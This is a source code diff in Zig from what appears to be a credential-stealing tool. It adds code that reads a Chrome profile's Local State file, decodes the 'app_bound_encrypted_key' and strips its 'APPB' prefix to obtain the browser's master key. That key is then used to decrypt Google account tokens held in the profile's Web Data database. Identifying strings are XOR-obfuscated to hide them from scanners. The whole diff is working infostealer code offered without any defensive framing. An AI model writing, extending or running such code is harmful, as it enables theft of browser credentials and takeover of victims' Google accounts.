@@ -2,12 +2,74 @@ const std = @import("std");
 const sqLoot = @import("../parsers/sqLoot.zig");
 const chrome_key = @import("../crypto/chrome_key.zig");
 const chrome_crypto = @import("../crypto/chrome_crypto.zig");
+const appbound = @import("appbound.zig");
 const file_io = @import("../parsers/file_io.zig");
+const hash = @import("../types/hash.zig");
+
+const E = struct {
+    pub const app_bound_key = hash.xorEncrypt("app_bound_encrypted_key");
+    pub const appb_prefix = hash.xorEncrypt("APPB");
+};
+
+fn extractAppBoundKey(json: []const u8, out: *[256]u8) ?[]u8 {
+    var key_str_buf: [E.app_bound_key.len]u8 = undefined;
+    hash.xorDecrypt(&E.app_bound_key, &key_str_buf);
+
+    const key_start = std.mem.indexOf(u8, json, &key_str_buf) orelse return null;
+    const colon = std.mem.indexOfScalarPos(u8, json, key_start, '"') orelse return null;
+    const val_start = std.mem.indexOfScalarPos(u8, json, colon + 1, '"') orelse return null;
+    var val_end = val_start + 1;
+    while (val_end < json.len) : (val_end += 1) {
+        if (json[val_end] == '"') break;
+    }
+    if (val_end <= val_start + 1) return null;
+
+    const b64_encoded = json[val_start + 1 .. val_end];
+    var b64_buf: [512]u8 = undefined;
+    const decoded = chrome_key.base64Decode(b64_encoded, &b64_buf) orelse return null;
+
+    var appb_buf: [E.appb_prefix.len]u8 = undefined;
+    hash.xorDecrypt(&E.appb_prefix, &appb_buf);
+
+    const key_bytes = if (decoded.len > 4 and std.mem.eql(u8, decoded[0..4], &appb_buf)) decoded[4..] else decoded;
+    const copy_len = @min(key_bytes.len, out.len);
+    @memcpy(out[0..copy_len], key_bytes[0..copy_len]);
+    return out[0..copy_len];
+}
 
 pub const GoogleToken = struct {
     gaia_id: []const u8,
     token: []const u8,
 };
+
+fn extractMasterKey(json: []const u8) ?[32]u8 {
+    var b64_buf: [4096]u8 = undefined;
+    var key_buf: [256]u8 = undefined;
+
+    var appb_buf: [E.app_bound_key.len]u8 = undefined;
+    hash.xorDecrypt(&E.app_bound_key, &appb_buf);
+
+    const has_appbound = std.mem.indexOf(u8, json, &appb_buf) != null;
+
+    const encrypted_key = chrome_key.extractEncryptedKey(json, &b64_buf) orelse {
+        if (has_appbound) {
+            const app_key = extractAppBoundKey(json, &key_buf) orelse return null;
+            var mk: [32]u8 = undefined;
+            @memset(&mk, 0);
+            const cl = @min(app_key.len, mk.len);
+            @memcpy(mk[0..cl], app_key[0..cl]);
+            return mk;
+        }
+        return null;
+    };
+
+    const master_slice = chrome_crypto.decryptEncryptedKey(encrypted_key, &key_buf) orelse return null;
+    var master_key: [32]u8 = undefined;
+    @memset(&master_key, 0);
+    const copy_len = @min(master_slice.len, master_key.len);
+    @memcpy(master_key[0..copy_len], master_slice[0..copy_len]);
+    return master_key;
+}
 
 fn findColumnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
     const cols = db.getColumnNames(table) catch return null;
@@ -29,16 +91,7 @@ pub fn extractTokens(profile_path: []const u8, allocator: std.mem.Allocator) ![]
     defer ls_mapped.close();
     const json = ls_mapped.slice();
 
-    var b64_buf: [4096]u8 = undefined;
-    const encrypted_key = chrome_key.extractEncryptedKey(json, &b64_buf) orelse return &[_]GoogleToken{};
-
-    var key_buf: [256]u8 = undefined;
-    const master_slice = chrome_crypto.decryptEncryptedKey(encrypted_key, &key_buf) orelse return &[_]GoogleToken{};
-
-    var master_key: [32]u8 = undefined;
-    @memset(&master_key, 0);
-    const copy_len = @min(master_slice.len, master_key.len);
-    @memcpy(master_key[0..copy_len], master_slice[0..copy_len]);
+    const master_key = extractMasterKey(json) orelse return &[_]GoogleToken{};
 
     const wd_path = try std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Web Data" });
     defer allocator.free(wd_path);
